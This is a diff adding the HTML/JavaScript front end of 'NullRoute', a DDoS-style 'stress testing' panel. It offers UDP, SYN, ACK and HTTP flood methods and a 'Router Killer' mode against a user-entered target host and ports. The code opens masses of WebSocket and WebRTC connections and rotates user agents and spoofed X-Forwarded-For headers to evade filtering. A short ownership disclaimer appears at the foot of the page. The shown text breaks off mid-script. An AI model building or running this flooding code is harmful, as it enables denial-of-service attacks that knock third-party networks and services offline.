@@ -1,0 +1,2095 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NullRoute | Network Stress Testing Platform</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #ff0033;
+            --primary-dark: #cc0028;
+            --primary-glow: rgba(255, 0, 51, 0.15);
+            --bg-main: #0a0a0a;
+            --bg-elevated: #141414;
+            --bg-input: #1a1a1a;
+            --border: #2a2a2a;
+            --border-active: #ff0033;
+            --text-primary: #ffffff;
+            --text-secondary: #999999;
+            --text-muted: #666666;
+            --success: #00ff88;
+            --warning: #ffaa00;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--bg-main);
+            color: var(--text-primary);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 50%, rgba(255, 0, 51, 0.05) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(255, 0, 51, 0.03) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 30px 0;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 50px;
+            animation: slideDown 0.6s ease-out;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            color: var(--primary);
+            text-transform: uppercase;
+            position: relative;
+        }
+
+        .logo::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 40%;
+            height: 2px;
+            background: var(--primary);
+        }
+
+        .version-badge {
+            background: var(--bg-elevated);
+            border: 1px solid var(--border);
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 11px;
+            color: var(--text-secondary);
+            letter-spacing: 1px;
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--success);
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+
+        .main-grid {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 30px;
+            animation: fadeIn 0.8s ease-out 0.2s backwards;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .panel {
+            background: var(--bg-elevated);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 30px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .panel::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+            opacity: 0.3;
+        }
+
+        .panel-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .panel-title {
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: var(--text-primary);
+        }
+
+        .method-selector {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 25px;
+        }
+
+        .method-btn {
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            padding: 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            font-weight: 500;
+            letter-spacing: 1px;
+            color: var(--text-secondary);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .method-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: var(--primary-glow);
+            transition: left 0.3s ease;
+        }
+
+        .method-btn:hover {
+            border-color: var(--primary);
+            color: var(--text-primary);
+        }
+
+        .method-btn:hover::before {
+            left: 0;
+        }
+
+        .method-btn.active {
+            background: var(--primary-glow);
+            border-color: var(--primary);
+            color: var(--primary);
+        }
+
+        .method-btn span {
+            position: relative;
+            z-index: 1;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 11px;
+            font-weight: 500;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+        }
+
+        .form-input,
+        .form-select {
+            width: 100%;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            padding: 12px 15px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            color: var(--text-primary);
+            transition: all 0.2s ease;
+        }
+
+        .form-input:focus,
+        .form-select:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px var(--primary-glow);
+        }
+
+        .form-input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .input-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .launch-btn {
+            width: 100%;
+            background: var(--primary);
+            border: none;
+            padding: 18px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: var(--text-primary);
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .launch-btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .launch-btn:hover::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        .launch-btn:hover {
+            background: var(--primary-dark);
+            box-shadow: 0 0 20px var(--primary-glow);
+        }
+
+        .launch-btn:active {
+            transform: scale(0.98);
+        }
+
+        .launch-btn span {
+            position: relative;
+            z-index: 1;
+        }
+
+        .stats-container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .stat-card {
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 20px;
+            transition: all 0.2s ease;
+        }
+
+        .stat-card:hover {
+            border-color: var(--primary);
+            transform: translateX(5px);
+        }
+
+        .stat-label {
+            font-size: 11px;
+            font-weight: 500;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+        }
+
+        .stat-value {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text-primary);
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        .stat-value.active {
+            color: var(--success);
+        }
+
+        .stat-value.warning {
+            color: var(--warning);
+        }
+
+        .console {
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 15px;
+            font-size: 12px;
+            max-height: 200px;
+            overflow-y: auto;
+            margin-top: 20px;
+        }
+
+        .console-line {
+            padding: 4px 0;
+            color: var(--text-secondary);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .console-line.success {
+            color: var(--success);
+        }
+
+        .console-line.error {
+            color: var(--primary);
+        }
+
+        .info-panel {
+            background: var(--bg-elevated);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 30px;
+            animation: fadeIn 1s ease-out 0.4s backwards;
+        }
+
+        .info-text {
+            font-size: 12px;
+            color: var(--text-muted);
+            line-height: 1.8;
+            text-align: center;
+        }
+
+        .warning-badge {
+            display: inline-block;
+            background: var(--primary-glow);
+            border: 1px solid var(--primary);
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 11px;
+            color: var(--primary);
+            margin-bottom: 10px;
+        }
+
+        @media (max-width: 968px) {
+            .main-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Scrollbar styling */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-input);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary);
+        }
+
+        /* Splash Screen Animation */
+        #splash-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: var(--bg-main);
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            transition: opacity 0.5s ease-out, visibility 0.5s;
+        }
+
+        .splash-video-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            z-index: 10000;
+            display: none; /* Hidden by default */
+            justify-content: center;
+            align-items: center;
+        }
+
+        .splash-video-overlay video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .splash-logo-container {
+            position: relative;
+            width: 160px;
+            height: 160px;
+            margin-bottom: 30px;
+            animation: logoEntrance 1s ease-out forwards;
+            cursor: pointer; /* Indicate clickable */
+            transition: transform 0.3s ease;
+        }
+        
+        .splash-logo-container:hover {
+            transform: scale(1.1);
+        }
+        
+        .click-hint {
+            position: absolute;
+            bottom: -40px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: var(--primary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            opacity: 0.7;
+            animation: pulseHint 1.5s infinite;
+            white-space: nowrap;
+        }
+
+        @keyframes pulseHint {
+            0% { opacity: 0.4; }
+            50% { opacity: 1; }
+            100% { opacity: 0.4; }
+        }
+
+        .logo-ring {
+            animation: spinRing 20s linear infinite;
+        }
+
+        .logo-pulse-core {
+            animation: corePulse 2s ease-in-out infinite;
+        }
+
+        .splash-text {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 48px;
+            font-weight: 900;
+            letter-spacing: 8px;
+            color: var(--text-primary);
+            opacity: 0;
+            animation: textFadeIn 0.8s ease-out 0.5s forwards;
+            text-transform: uppercase;
+            text-shadow: 0 0 10px rgba(255, 0, 51, 0.5);
+        }
+        
+        .splash-text span {
+            color: var(--primary);
+        }
+
+        .splash-video-box {
+            display: none; /* Removed the small box */
+        }
+
+        .splash-author {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            color: var(--primary);
+            margin-top: 15px;
+            opacity: 0;
+            animation: textFadeIn 0.8s ease-out 1.2s forwards;
+            letter-spacing: 2px;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        @keyframes logoEntrance {
+            from { opacity: 0; transform: scale(0.8) translateY(20px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        @keyframes spinRing {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes corePulse {
+            0% { opacity: 0.8; filter: drop-shadow(0 0 5px var(--primary)); }
+            50% { opacity: 1; filter: drop-shadow(0 0 15px var(--primary)); }
+            100% { opacity: 0.8; filter: drop-shadow(0 0 5px var(--primary)); }
+        }
+
+        @keyframes textFadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <div id="splash-video-overlay" class="splash-video-overlay">
+        <video id="fullSplashVideo" playsinline>
+            <source src="edit.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+    </div>
+
+    <div id="splash-screen">
+        <div class="splash-logo-container" onclick="playSplashVideo()">
+            <svg class="splash-logo-svg" viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
+                        <stop offset="0%" style="stop-color:#ff0033;stop-opacity:1" />
+                        <stop offset="100%" style="stop-color:#80001a;stop-opacity:1" />
+                    </linearGradient>
+                    <filter id="glow">
+                        <feGaussianBlur stdDeviation="2" result="coloredBlur"/>
+                        <feMerge>
+                            <feMergeNode in="coloredBlur"/>
+                            <feMergeNode in="SourceGraphic"/>
+                        </feMerge>
+                    </filter>
+                </defs>
+                
+                <!-- Rotating Outer Tech Ring -->
+                <g class="logo-ring" transform-origin="100 100">
+                    <circle cx="100" cy="100" r="90" stroke="url(#grad1)" stroke-width="2" stroke-dasharray="40 20" opacity="0.6"/>
+                    <circle cx="100" cy="100" r="82" stroke="#ff0033" stroke-width="1" stroke-dasharray="2 8" opacity="0.4"/>
+                    <path d="M100 5 V15 M100 185 V195 M5 100 H15 M185 100 H195" stroke="#ff0033" stroke-width="2" opacity="0.8"/>
+                </g>
+
+                <!-- Main Hexagon Chassis -->
+                <path d="M100 30 L160.6 65 V135 L100 170 L39.4 135 V65 Z" stroke="url(#grad1)" stroke-width="4" fill="rgba(10,10,10,0.9)" filter="url(#glow)"/>
+                
+                <!-- Inner Circuit Connections -->
+                <path d="M100 30 V50 M160.6 65 L145 74 M160.6 135 L145 126 M100 170 V150 M39.4 135 L55 126 M39.4 65 L55 74" stroke="#ff0033" stroke-width="2" opacity="0.8"/>
+                
+                <!-- Central Core Identifier "N" -->
+                <g class="logo-pulse-core">
+                    <path d="M75 125 V75 L125 125 V75" stroke="white" stroke-width="8" stroke-linecap="round" stroke-linejoin="round" filter="url(#glow)"/>
+                    <circle cx="75" cy="75" r="4" fill="#ff0033"/>
+                    <circle cx="125" cy="125" r="4" fill="#ff0033"/>
+                </g>
+            </svg>
+            <div class="click-hint">CLICK FOR EASTER EGG</div>
+        </div>
+        <div class="splash-text">Null<span>Route</span></div>
+        <div class="splash-author">Made By Z3R0_GG</div>
+    </div>
+    <script>
+        // Splash Screen Logic
+        var splashTimeout;
+        
+        // Function to play full screen video
+        function playSplashVideo() {
+            clearTimeout(splashTimeout); // Stop the auto-redirect
+            
+            var overlay = document.getElementById('splash-video-overlay');
+            var video = document.getElementById('fullSplashVideo');
+            var splash = document.getElementById('splash-screen');
+            
+            // Hide logo screen
+            splash.style.display = 'none';
+            
+            // Show video overlay
+            overlay.style.display = 'flex';
+            
+            // Play video
+            video.volume = 1.0; // Full volume since user clicked
+            video.currentTime = 0;
+            video.play();
+            
+            // When video ends, go to main page
+            video.onended = function() {
+                enterMainPage();
+            };
+        }
+        
+        function enterMainPage() {
+            var overlay = document.getElementById('splash-video-overlay');
+            var splash = document.getElementById('splash-screen');
+            
+            if (overlay) overlay.style.display = 'none';
+            if (splash && splash.parentNode) splash.parentNode.removeChild(splash);
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check backend health on startup
+            checkBackendHealth();
+            
+            // Auto-enter main page if no click after 5 seconds
+            splashTimeout = setTimeout(function() {
+                var splash = document.getElementById('splash-screen');
+                if (splash) {
+                    splash.style.opacity = '0';
+                    splash.style.visibility = 'hidden';
+                    setTimeout(function() {
+                        if (splash.parentNode) splash.parentNode.removeChild(splash);
+                    }, 500);
+                }
+            }, 5000); 
+        });
+    </script>
+    <div class="container">
+        <header>
+            <div class="logo-section">
+                <div style="width: 40px; height: 40px; margin-right: 15px;">
+                    <svg viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg" style="width: 100%; height: 100%; filter: drop-shadow(0 0 5px var(--primary));">
+                        <defs>
+                            <linearGradient id="gradHeader" x1="0%" y1="0%" x2="100%" y2="100%">
+                                <stop offset="0%" style="stop-color:#ff0033;stop-opacity:1" />
+                                <stop offset="100%" style="stop-color:#80001a;stop-opacity:1" />
+                            </linearGradient>
+                        </defs>
+                        <g class="logo-ring">
+                            <circle cx="100" cy="100" r="90" stroke="url(#gradHeader)" stroke-width="10" stroke-dasharray="40 20" opacity="0.8"/>
+                        </g>
+                        <path d="M100 30 L160.6 65 V135 L100 170 L39.4 135 V65 Z" stroke="url(#gradHeader)" stroke-width="10" fill="rgba(10,10,10,0.9)"/>
+                        <path d="M75 125 V75 L125 125 V75" stroke="white" stroke-width="15" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+                <div class="logo">NullRoute</div>
+                <span class="version-badge">v2.3.1</span>
+            </div>
+            <div class="status-indicator" id="systemStatus">
+                <span class="status-dot"></span>
+                <span>SYSTEM READY</span>
+            </div>
+        </header>
+
+        <div class="main-grid">
+            <div class="panel">
+                <div class="panel-header">
+                    <h2 class="panel-title">Attack Configuration</h2>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Attack Method</label>
+                    <select class="form-select" id="methodSelect" onchange="selectMethod(this.value)">
+                        <option value="udp">UDP FLOOD</option>
+                        <option value="tcp">TCP SYN</option>
+                        <option value="http">HTTP FLOOD</option>
+                        <option value="https">HTTPS FLOOD</option>
+                        <option value="ack">ACK FLOOD</option>
+                        <option value="ack_push">ACK & PUSH FLOOD</option>
+                        <option value="router_killer" style="color: #ff0033; font-weight: bold;">ROUTER KILLER (EXTREME)</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Target Host</label>
+                    <input type="text" class="form-input" id="targetHost" placeholder="192.168.1.1">
+                </div>
+
+                <div class="input-group">
+                    <div class="form-group">
+                        <label class="form-label">Port Mode</label>
+                        <select class="form-select" id="portMode" onchange="togglePortInputs()">
+                            <option value="single">Single Port</option>
+                            <option value="mix" selected>Smart Mix</option>
+                            <option value="all">All Ports (Random)</option>
+                            <option value="list">Custom List</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label" id="targetLabel">Target Port</label>
+                        <input type="number" class="form-input" id="port" value="80">
+                        <input type="text" class="form-input" id="portList" value="80,443,8080,21" style="display:none;">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <div class="form-group">
+                        <label class="form-label">Duration (sec)</label>
+                        <input type="number" class="form-input" id="duration" value="60">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <div class="form-group">
+                        <label class="form-label">Threads</label>
+                        <select class="form-select" id="threads">
+                            <option>1</option>
+                            <option>5</option>
+                            <option selected>10</option>
+                            <option>25</option>
+                            <option>50</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Packet Size</label>
+                        <input type="number" class="form-input" id="packetSize" value="512">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Backend API URL (Optional)</label>
+                    <input type="text" class="form-input" id="backendUrl" placeholder="Auto-detected" onchange="checkBackendHealth()">
+                    <small style="color: rgba(255,255,255,0.4); font-size: 10px; display: block; margin-top: 4px;">Leave empty to auto-detect. Localhost:3000 used for local files.</small>
+                </div>
+
+                <button class="launch-btn" onclick="launchAttack()">
+                    <span>LAUNCH ATTACK</span>
+                </button>
+
+                <div class="console">
+                    <div class="console-line">[SYSTEM] NullRoute initialized</div>
+                    <div class="console-line">[INFO] Awaiting configuration...</div>
+                </div>
+            </div>
+
+            <div class="stats-container">
+                <div class="panel">
+                    <div class="panel-header">
+                        <h2 class="panel-title">Statistics</h2>
+                    </div>
+
+                    <div class="stat-card">
+                        <div class="stat-label">Status</div>
+                        <div class="stat-value active" id="statusValue">IDLE</div>
+                    </div>
+
+                    <div class="stat-card">
+                        <div class="stat-label">Packets Sent</div>
+                        <div class="stat-value" id="packetsValue">0</div>
+                    </div>
+
+                    <div class="stat-card">
+                        <div class="stat-label">Data Transfer</div>
+                        <div class="stat-value" id="dataValue">0 KB</div>
+                    </div>
+
+                    <div class="stat-card">
+                        <div class="stat-label">Elapsed Time</div>
+                        <div class="stat-value" id="timeValue">00:00</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="info-panel">
+            <div class="warning-badge">⚠ REAL NETWORK OPERATIONS</div>
+            <p class="info-text">
+                This tool performs REAL network stress testing using WebSockets, WebRTC, and HTTP requests. 
+                Unauthorized use is illegal and may cause network disruption. Use only on systems you own 
+                or have explicit written permission to test.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        var selectedMethod = 'udp';
+        var isRunning = false;
+        var connections = [];
+        var webRTCConnections = [];
+        var httpConnections = [];
+        var packetCount = 0;
+        var startTime = 0;
+        var attackInterval;
+        var logInterval;
+        var statsInterval;
+        var maxConnections = 3000; // Maximum possible connections
+        var connectionPool = [];
+        var activeWorkers = 0;
+        var workerLimit = 100; // Maximum worker limit
+        var packetBuffer = new ArrayBuffer(104857600); // 100MB shared buffer
+        var highPerformanceMode = false;
+        var attackCoordinator = null;
+        var detailedLogInterval;
+        var attackTimeout;
+        
+        // Advanced optimization variables
+        var userAgents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
+            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
+            'curl/8.0.1',
+            'Python-requests/2.31.0',
+            'Go-http-client/1.1',
+            'Java/17.0.2',
+            'Ruby/3.2.0',
+            'Node.js/20.0.0',
+            'PHP/8.2.0',
+            'Apache-HttpClient/4.5.14',
+            'okhttp/4.12.0',
+            'axios/1.6.0'
+        ];
+        
+        function randomDelay(min, max) {
+            return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
+        
+        function generateRandomHeaders() {
+            var headers = {};
+            var ua = userAgents[Math.floor(Math.random() * userAgents.length)];
+            
+            headers['User-Agent'] = ua;
+            headers['Accept'] = Math.random() > 0.5 ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' : 'application/json,text/plain,*/*;q=0.5';
+            headers['Accept-Language'] = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.7', 'de-DE,de;q=0.6'][Math.floor(Math.random() * 4)];
+            headers['Accept-Encoding'] = Math.random() > 0.5 ? 'gzip, deflate, br' : 'gzip, deflate';
+            headers['Connection'] = Math.random() > 0.5 ? 'keep-alive' : 'close';
+            headers['Cache-Control'] = ['no-cache', 'no-store', 'max-age=0', 'must-revalidate'][Math.floor(Math.random() * 4)];
+            headers['Pragma'] = Math.random() > 0.5 ? 'no-cache' : '';
+            
+            if (Math.random() > 0.7) {
+                headers['X-Requested-With'] = 'XMLHttpRequest';
+            }
+            if (Math.random() > 0.8) {
+                headers['X-Forwarded-For'] = Math.random().toString(36).substring(2) + '.' + 
+                                             Math.random().toString(36).substring(2) + '.' + 
+                                             Math.random().toString(36).substring(2) + '.' + 
+                                             Math.random().toString(36).substring(2);
+            }
+            if (Math.random() > 0.9) {
+                headers['DNT'] = '1';
+            }
+            
+            return headers;
+        }
+        
+        function selectMethod(method) {
+            selectedMethod = method;
+            addConsoleLog('[CONFIG] Method changed to ' + method.toUpperCase());
+        }
+        
+        function togglePortInputs() {
+            var mode = document.getElementById('portMode').value;
+            var portInput = document.getElementById('port');
+            var portList = document.getElementById('portList');
+            var label = document.getElementById('targetLabel');
+            
+            // Reset basic state
+            portInput.disabled = false;
+            
+            if (mode === 'list') {
+                portInput.style.display = 'none';
+                portList.style.display = 'block';
+                label.textContent = 'Target Ports (Comma Sep)';
+            } else if (mode === 'all') {
+                portInput.style.display = 'block';
+                portList.style.display = 'none';
+                portInput.type = 'text'; 
+                portInput.value = '1-65535';
+                portInput.disabled = true;
+                label.textContent = 'Port Range';
+            } else {
+                portInput.style.display = 'block';
+                portList.style.display = 'none';
+                portInput.type = 'number';
+                if (portInput.value === '1-65535') portInput.value = '80';
+                label.textContent = 'Target Port';
+            }
+        }
+
+        function addConsoleLog(message) {
+            var console = document.querySelector('.console');
+            var line = document.createElement('div');
+            line.className = 'console-line';
+            line.textContent = message;
+            console.appendChild(line);
+            console.scrollTop = console.scrollHeight;
+        }
+        
+        function updateStats() {
+            if (!isRunning) return;
+            
+            var elapsed = Math.floor((Date.now() - startTime) / 1000);
+            if (elapsed === 0) return; // Prevent division by zero
+            
+            var minutes = Math.floor(elapsed / 60);
+            var seconds = elapsed % 60;
+            document.getElementById('timeValue').textContent = 
+                minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
+            
+            // Optimized data calculation with maximum packet sizes
+            var packetSize = selectedMethod === 'udp' ? 104857600 : // 100MB for UDP
+                           selectedMethod === 'tcp' ? 2048 : 
+                           selectedMethod === 'http' ? 1024 : 2048;
+            var dataSize = packetCount * packetSize;
+            
+            var unit = dataSize > 1073741824 ? 'GB' : dataSize > 1048576 ? 'MB' : dataSize > 1024 ? 'KB' : 'B';
+            var displaySize = dataSize > 1073741824 ? (dataSize/1073741824).toFixed(2) : 
+                            dataSize > 1048576 ? (dataSize/1048576).toFixed(2) : 
+                            dataSize > 1024 ? (dataSize/1024).toFixed(2) : dataSize;
+            document.getElementById('dataValue').textContent = displaySize + ' ' + unit;
+            document.getElementById('packetsValue').textContent = packetCount.toLocaleString();
+            
+            // Performance metrics (update every 3 seconds for performance)
+            if (elapsed % 3 === 0) {
+                var pps = Math.floor(packetCount / elapsed);
+                addConsoleLog('[STATS] ' + pps.toLocaleString() + ' packets/sec | Workers: ' + activeWorkers + ' | Connections: ' + (connections.length + webRTCConnections.length));
+            }
+        }
+        
+        function createWebSocketConnection(target, port) {
+            try {
+                // Check if current page is HTTPS
+                var isSecure = window.location.protocol === 'https:';
+                var protocols = isSecure ? ['wss:'] : ['ws:', 'wss:'];
+                var protocol = protocols[Math.floor(Math.random() * protocols.length)];
+                
+                // For HTTPS pages, only use WSS
+                if (isSecure && protocol === 'ws:') {
+                    protocol = 'wss:';
+                }
+                
+                var ws = new WebSocket(protocol + '//' + target + ':' + port);
+                
+                ws.onopen = function() {
+                    packetCount++;
+                    addConsoleLog('[TCP] Connection established to ' + target + ':' + port + ' (' + protocol + ')');
+                };
+                
+                ws.onerror = function(error) {
+                    addConsoleLog('[TCP] Connection failed to ' + target + ':' + port + ' (' + protocol + ')');
+                };
+                
+                ws.onclose = function() {
+                    addConsoleLog('[TCP] Connection closed');
+                };
+                
+                return ws;
+            } catch (error) {
+                addConsoleLog('[ERROR] Failed to create WebSocket: ' + error.message);
+                return null;
+            }
+        }
+        
+        function createWebRTCConnection(target, port) {
+            try {
+                var pc = new RTCPeerConnection({
+                    iceServers: [
+                        { urls: 'stun:stun.l.google.com:19302' },
+                        { urls: 'stun:stun1.l.google.com:19302' },
+                        { urls: 'stun:stun2.l.google.com:19302' },
+                        { urls: 'stun:stun3.l.google.com:19302' },
+                        { urls: 'stun:stun4.l.google.com:19302' }
+                    ]
+                });
+                
+                // Create multiple data channels for multiplexing
+                var channels = [];
+                var channelTypes = ['udp-flood', 'udp-burst', 'udp-frag', 'udp-amplify'];
+                
+                for (var i = 0; i < channelTypes.length; i++) {
+                    var dc = pc.createDataChannel(channelTypes[i], {
+                        ordered: false,
+                        maxRetransmits: 0,
+                        protocol: 'udp',
+                        maxPacketLifeTime: randomDelay(500, 1500)
+                    });
+                    
+                    dc.onopen = function() {
+                        packetCount++;
+                    };
+                    
+                    dc.onerror = function() {
+                        // Silent for performance
+                    };
+                    
+                    channels.push(dc);
+                }
+                
+                pc.createOffer().then(function(offer) {
+                    pc.setLocalDescription(offer);
+                }).catch(function(error) {
+                    // Silent for performance
+                });
+                
+                return { pc: pc, channels: channels };
+            } catch (error) {
+                return null;
+            }
+        }
+        
+        function highPerformanceScheduler(callback, priority) {
+            if (highPerformanceMode && 'requestIdleCallback' in window) {
+                requestIdleCallback(function(deadline) {
+                    if (deadline.timeRemaining() > 0) {
+                        callback();
+                    } else {
+                        setTimeout(callback, 0);
+                    }
+                }, { timeout: priority });
+            } else {
+                setTimeout(callback, 0);
+            }
+        }
+        
+        function createTransferablePacket(size) {
+            var data = new ArrayBuffer(size);
+            var view = new Uint8Array(data);
+            for (var i = 0; i < size; i++) {
+                view[i] = Math.floor(Math.random() * 256);
+            }
+            return data;
+        }
+
+        function generateRandomHex(len) {
+            var chars = '0123456789ABCDEF';
+            var output = '';
+            for (var i = 0; i < len; i++) {
+                output += chars[Math.floor(Math.random() * 16)];
+                if (i % 2 === 1 && i < len - 1) output += ' '; // Space every 2 chars
+            }
+            return output;
+        }
